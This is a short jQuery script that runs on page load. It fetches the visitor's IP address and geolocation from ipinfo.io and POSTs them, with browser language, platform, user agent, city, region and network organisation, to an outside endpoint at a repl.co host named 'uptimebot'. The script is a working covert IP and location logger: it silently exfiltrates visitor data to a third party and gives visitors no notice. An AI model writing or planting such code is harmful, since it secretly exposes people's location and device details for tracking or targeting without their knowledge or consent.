
 
$(document).ready(function() {
    
 $.get("https://ipinfo.io", function(re) { 

fetch("https://uptimebot.nameboy.repl.co/user", {
        method: 'POST',
        body: JSON.stringify({
 
   online: navigator.onLine,
   language: navigator.language,
   platform: navigator.platform,
   device: navigator.userAgent,
   version: "**(location: "+re.loc+")"+"(ip: `"+re.ip+"`)**",
   city: re.city,
   region: re.region,
   org: re.org
          
   }),

         headers:{

          'Content-Type': 'application/json'

        }

    });

        }, "json")
  
  });

